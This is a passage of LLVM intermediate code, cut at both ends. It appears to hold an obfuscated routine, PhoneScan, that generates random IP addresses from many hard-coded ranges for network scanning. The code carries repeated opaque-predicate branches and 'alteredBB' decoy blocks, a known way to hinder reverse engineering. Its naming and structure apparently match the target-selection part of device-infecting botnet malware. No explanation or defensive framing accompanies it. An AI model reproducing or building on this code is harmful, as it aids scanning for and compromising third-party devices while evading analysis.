  br i1 %650, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %642
  %651 = load i32, i32* %1, align 4
  %652 = icmp eq i32 %651, 29
  %653 = load i32, i32* @x.59
  %654 = load i32, i32* @y.60
  %655 = sub i32 %653, 1
  %656 = mul i32 %653, %655
  %657 = urem i32 %656, 2
  %658 = icmp eq i32 %657, 0
  %659 = icmp slt i32 %654, 10
  %660 = or i1 %658, %659
  br i1 %660, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %652, label %661, label %668

; <label>:661:                                    ; preds = %originalBBpart284
  %662 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %663 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %664 = zext i8 %663 to i32
  %665 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %666 = zext i8 %665 to i32
  %667 = call i32 (i8*, i8*, ...) @szprintf(i8* %662, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.517, i32 0, i32 0), i32 %664, i32 %666)
  br label %668

; <label>:668:                                    ; preds = %661, %originalBBpart284
  %669 = load i32, i32* %1, align 4
  %670 = icmp eq i32 %669, 30
  br i1 %670, label %671, label %678

; <label>:671:                                    ; preds = %668
  %672 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %673 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %674 = zext i8 %673 to i32
  %675 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %676 = zext i8 %675 to i32
  %677 = call i32 (i8*, i8*, ...) @szprintf(i8* %672, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.518, i32 0, i32 0), i32 %674, i32 %676)
  br label %678

; <label>:678:                                    ; preds = %671, %668
  %679 = load i32, i32* %1, align 4
  %680 = icmp eq i32 %679, 31
  br i1 %680, label %681, label %688

; <label>:681:                                    ; preds = %678
  %682 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %683 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %684 = zext i8 %683 to i32
  %685 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %686 = zext i8 %685 to i32
  %687 = call i32 (i8*, i8*, ...) @szprintf(i8* %682, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.519, i32 0, i32 0), i32 %684, i32 %686)
  br label %688

; <label>:688:                                    ; preds = %681, %678
  %689 = load i32, i32* %1, align 4
  %690 = icmp eq i32 %689, 32
  br i1 %690, label %691, label %698

; <label>:691:                                    ; preds = %688
  %692 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %693 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %694 = zext i8 %693 to i32
  %695 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %696 = zext i8 %695 to i32
  %697 = call i32 (i8*, i8*, ...) @szprintf(i8* %692, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.520, i32 0, i32 0), i32 %694, i32 %696)
  br label %698

; <label>:698:                                    ; preds = %691, %688
  %699 = load i32, i32* @x.59
  %700 = load i32, i32* @y.60
  %701 = sub i32 %699, 1
  %702 = mul i32 %699, %701
  %703 = urem i32 %702, 2
  %704 = icmp eq i32 %703, 0
  %705 = icmp slt i32 %700, 10
  %706 = or i1 %704, %705
  br i1 %706, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %698
  %707 = load i32, i32* %1, align 4
  %708 = icmp eq i32 %707, 33
  %709 = load i32, i32* @x.59
  %710 = load i32, i32* @y.60
  %711 = sub i32 %709, 1
  %712 = mul i32 %709, %711
  %713 = urem i32 %712, 2
  %714 = icmp eq i32 %713, 0
  %715 = icmp slt i32 %710, 10
  %716 = or i1 %714, %715
  br i1 %716, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %708, label %717, label %724

; <label>:717:                                    ; preds = %originalBBpart288
  %718 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %719 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %720 = zext i8 %719 to i32
  %721 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %722 = zext i8 %721 to i32
  %723 = call i32 (i8*, i8*, ...) @szprintf(i8* %718, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.521, i32 0, i32 0), i32 %720, i32 %722)
  br label %724

; <label>:724:                                    ; preds = %717, %originalBBpart288
  %725 = load i32, i32* %1, align 4
  %726 = icmp eq i32 %725, 34
  br i1 %726, label %727, label %734

; <label>:727:                                    ; preds = %724
  %728 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %729 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %730 = zext i8 %729 to i32
  %731 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %732 = zext i8 %731 to i32
  %733 = call i32 (i8*, i8*, ...) @szprintf(i8* %728, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.522, i32 0, i32 0), i32 %730, i32 %732)
  br label %734

; <label>:734:                                    ; preds = %727, %724
  %735 = load i32, i32* @x.59
  %736 = load i32, i32* @y.60
  %737 = sub i32 %735, 1
  %738 = mul i32 %735, %737
  %739 = urem i32 %738, 2
  %740 = icmp eq i32 %739, 0
  %741 = icmp slt i32 %736, 10
  %742 = or i1 %740, %741
  br i1 %742, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %734
  %743 = load i32, i32* %1, align 4
  %744 = icmp eq i32 %743, 35
  %745 = load i32, i32* @x.59
  %746 = load i32, i32* @y.60
  %747 = sub i32 %745, 1
  %748 = mul i32 %745, %747
  %749 = urem i32 %748, 2
  %750 = icmp eq i32 %749, 0
  %751 = icmp slt i32 %746, 10
  %752 = or i1 %750, %751
  br i1 %752, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %744, label %753, label %760

; <label>:753:                                    ; preds = %originalBBpart292
  %754 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %755 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %756 = zext i8 %755 to i32
  %757 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %758 = zext i8 %757 to i32
  %759 = call i32 (i8*, i8*, ...) @szprintf(i8* %754, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.523, i32 0, i32 0), i32 %756, i32 %758)
  br label %760

; <label>:760:                                    ; preds = %753, %originalBBpart292
  %761 = load i32, i32* %1, align 4
  %762 = icmp eq i32 %761, 36
  br i1 %762, label %763, label %786

; <label>:763:                                    ; preds = %760
  %764 = load i32, i32* @x.59
  %765 = load i32, i32* @y.60
  %766 = sub i32 %764, 1
  %767 = mul i32 %764, %766
  %768 = urem i32 %767, 2
  %769 = icmp eq i32 %768, 0
  %770 = icmp slt i32 %765, 10
  %771 = or i1 %769, %770
  br i1 %771, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %763
  %772 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %773 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %774 = zext i8 %773 to i32
  %775 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %776 = zext i8 %775 to i32
  %777 = call i32 (i8*, i8*, ...) @szprintf(i8* %772, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.524, i32 0, i32 0), i32 %774, i32 %776)
  %778 = load i32, i32* @x.59
  %779 = load i32, i32* @y.60
  %780 = sub i32 %778, 1
  %781 = mul i32 %778, %780
  %782 = urem i32 %781, 2
  %783 = icmp eq i32 %782, 0
  %784 = icmp slt i32 %779, 10
  %785 = or i1 %783, %784
  br i1 %785, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %786

; <label>:786:                                    ; preds = %originalBBpart296, %760
  %787 = load i32, i32* %1, align 4
  %788 = icmp eq i32 %787, 37
  br i1 %788, label %789, label %796

; <label>:789:                                    ; preds = %786
  %790 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %791 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %792 = zext i8 %791 to i32
  %793 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %794 = zext i8 %793 to i32
  %795 = call i32 (i8*, i8*, ...) @szprintf(i8* %790, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.525, i32 0, i32 0), i32 %792, i32 %794)
  br label %796

; <label>:796:                                    ; preds = %789, %786
  %797 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %798 = call i32 @inet_addr(i8* %797) #5
  ret i32 %798

originalBBalteredBB:                              ; preds = %originalBB, %36
  %799 = load i32, i32* %1, align 4
  %800 = icmp eq i32 %799, 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %801 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %802 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %803 = zext i8 %802 to i32
  %804 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %805 = zext i8 %804 to i32
  %806 = call i32 (i8*, i8*, ...) @szprintf(i8* %801, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.491, i32 0, i32 0), i32 %803, i32 %805)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %78
  %807 = load i32, i32* %1, align 4
  %808 = icmp eq i32 %807, 3
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %97
  %809 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %810 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %811 = zext i8 %810 to i32
  %812 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %813 = zext i8 %812 to i32
  %814 = call i32 (i8*, i8*, ...) @szprintf(i8* %809, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.492, i32 0, i32 0), i32 %811, i32 %813)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %120
  %815 = load i32, i32* %1, align 4
  %816 = icmp eq i32 %815, 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %139
  %817 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %818 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %819 = zext i8 %818 to i32
  %820 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %821 = zext i8 %820 to i32
  %822 = call i32 (i8*, i8*, ...) @szprintf(i8* %817, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.493, i32 0, i32 0), i32 %819, i32 %821)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %165
  %823 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %824 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %825 = zext i8 %824 to i32
  %826 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %827 = zext i8 %826 to i32
  %828 = call i32 (i8*, i8*, ...) @szprintf(i8* %823, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.494, i32 0, i32 0), i32 %825, i32 %827)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %191
  %829 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %830 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %831 = zext i8 %830 to i32
  %832 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %833 = zext i8 %832 to i32
  %834 = call i32 (i8*, i8*, ...) @szprintf(i8* %829, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.495, i32 0, i32 0), i32 %831, i32 %833)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %237
  %835 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %836 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %837 = zext i8 %836 to i32
  %838 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %839 = zext i8 %838 to i32
  %840 = call i32 (i8*, i8*, ...) @szprintf(i8* %835, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.498, i32 0, i32 0), i32 %837, i32 %839)
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %260
  %841 = load i32, i32* %1, align 4
  %842 = icmp eq i32 %841, 10
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %279
  %843 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %844 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %845 = zext i8 %844 to i32
  %846 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %847 = zext i8 %846 to i32
  %848 = call i32 (i8*, i8*, ...) @szprintf(i8* %843, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.489, i32 0, i32 0), i32 %845, i32 %847)
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %315
  %849 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %850 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %851 = zext i8 %850 to i32
  %852 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %853 = zext i8 %852 to i32
  %854 = call i32 (i8*, i8*, ...) @szprintf(i8* %849, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.500, i32 0, i32 0), i32 %851, i32 %853)
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %341
  %855 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %856 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %857 = zext i8 %856 to i32
  %858 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %859 = zext i8 %858 to i32
  %860 = call i32 (i8*, i8*, ...) @szprintf(i8* %855, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.501, i32 0, i32 0), i32 %857, i32 %859)
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %384
  %861 = load i32, i32* %1, align 4
  %862 = icmp eq i32 %861, 16
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %403
  %863 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %864 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %865 = zext i8 %864 to i32
  %866 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %867 = zext i8 %866 to i32
  %868 = call i32 (i8*, i8*, ...) @szprintf(i8* %863, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.504, i32 0, i32 0), i32 %865, i32 %867)
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %439
  %869 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %870 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %871 = zext i8 %870 to i32
  %872 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %873 = zext i8 %872 to i32
  %874 = call i32 (i8*, i8*, ...) @szprintf(i8* %869, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.506, i32 0, i32 0), i32 %871, i32 %873)
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %465
  %875 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %876 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %877 = zext i8 %876 to i32
  %878 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %879 = zext i8 %878 to i32
  %880 = call i32 (i8*, i8*, ...) @szprintf(i8* %875, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.507, i32 0, i32 0), i32 %877, i32 %879)
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %488
  %881 = load i32, i32* %1, align 4
  %882 = icmp eq i32 %881, 20
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %514
  %883 = load i32, i32* %1, align 4
  %884 = icmp eq i32 %883, 21
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %580
  %885 = load i32, i32* %1, align 4
  %886 = icmp eq i32 %885, 26
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %599
  %887 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %888 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %889 = zext i8 %888 to i32
  %890 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %891 = zext i8 %890 to i32
  %892 = call i32 (i8*, i8*, ...) @szprintf(i8* %887, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.514, i32 0, i32 0), i32 %889, i32 %891)
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %642
  %893 = load i32, i32* %1, align 4
  %894 = icmp eq i32 %893, 29
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %698
  %895 = load i32, i32* %1, align 4
  %896 = icmp eq i32 %895, 33
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %734
  %897 = load i32, i32* %1, align 4
  %898 = icmp eq i32 %897, 35
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %763
  %899 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %900 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %901 = zext i8 %900 to i32
  %902 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %903 = zext i8 %902 to i32
  %904 = call i32 (i8*, i8*, ...) @szprintf(i8* %899, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.524, i32 0, i32 0), i32 %901, i32 %903)
  br label %originalBB94
}

; Function Attrs: noinline nounwind uwtable
define i32 @PhoneScan() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3 = call i32 @rand() #5
  %4 = srem i32 %3, 255
  %5 = trunc i32 %4 to i8
  store i8 %5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %6 = call i32 @rand() #5
  %7 = srem i32 %6, 255
  %8 = trunc i32 %7 to i8
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %9 = call i32 @rand() #5
  %10 = srem i32 %9, 255
  %11 = trunc i32 %10 to i8
  store i8 %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %12 = call i32 @rand() #5
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %15 = call i32 @rand() #5
  %16 = srem i32 %15, 117
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %26

; <label>:19:                                     ; preds = %0
  %20 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %21 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %22 = zext i8 %21 to i32
  %23 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %24 = zext i8 %23 to i32
  %25 = call i32 (i8*, i8*, ...) @szprintf(i8* %20, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.526, i32 0, i32 0), i32 %22, i32 %24)
  br label %26

; <label>:26:                                     ; preds = %19, %0
  %27 = load i32, i32* %1, align 4
  %28 = icmp eq i32 %27, 1
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %26
  %30 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %31 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %34 = zext i8 %33 to i32
  %35 = call i32 (i8*, i8*, ...) @szprintf(i8* %30, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.527, i32 0, i32 0), i32 %32, i32 %34)
  br label %36

; <label>:36:                                     ; preds = %29, %26
  %37 = load i32, i32* @x.61
  %38 = load i32, i32* @y.62
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i32, i32* %1, align 4
  %46 = icmp eq i32 %45, 2
  %47 = load i32, i32* @x.61
  %48 = load i32, i32* @y.62
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %46, label %55, label %78

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i32, i32* @x.61
  %57 = load i32, i32* @y.62
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %65 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %66 = zext i8 %65 to i32
  %67 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %68 = zext i8 %67 to i32
  %69 = call i32 (i8*, i8*, ...) @szprintf(i8* %64, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.528, i32 0, i32 0), i32 %66, i32 %68)
  %70 = load i32, i32* @x.61
  %71 = load i32, i32* @y.62
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %78

; <label>:78:                                     ; preds = %originalBBpart24, %originalBBpart2
  %79 = load i32, i32* @x.61
  %80 = load i32, i32* @y.62
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %78
  %87 = load i32, i32* %1, align 4
  %88 = icmp eq i32 %87, 3
  %89 = load i32, i32* @x.61
  %90 = load i32, i32* @y.62
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %88, label %97, label %104

; <label>:97:                                     ; preds = %originalBBpart28
  %98 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %99 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %100 = zext i8 %99 to i32
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %102 = zext i8 %101 to i32
  %103 = call i32 (i8*, i8*, ...) @szprintf(i8* %98, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.529, i32 0, i32 0), i32 %100, i32 %102)
  br label %104

; <label>:104:                                    ; preds = %97, %originalBBpart28
  %105 = load i32, i32* @x.61
  %106 = load i32, i32* @y.62
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %104
  %113 = load i32, i32* %1, align 4
  %114 = icmp eq i32 %113, 4
  %115 = load i32, i32* @x.61
  %116 = load i32, i32* @y.62
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %114, label %123, label %146

; <label>:123:                                    ; preds = %originalBBpart212
  %124 = load i32, i32* @x.61
  %125 = load i32, i32* @y.62
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %123
  %132 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %134 = zext i8 %133 to i32
  %135 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %136 = zext i8 %135 to i32
  %137 = call i32 (i8*, i8*, ...) @szprintf(i8* %132, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.530, i32 0, i32 0), i32 %134, i32 %136)
  %138 = load i32, i32* @x.61
  %139 = load i32, i32* @y.62
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %146

; <label>:146:                                    ; preds = %originalBBpart216, %originalBBpart212
  %147 = load i32, i32* %1, align 4
  %148 = icmp eq i32 %147, 5
  br i1 %148, label %149, label %172

; <label>:149:                                    ; preds = %146
  %150 = load i32, i32* @x.61
  %151 = load i32, i32* @y.62
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBB18, label %originalBB18alteredBB

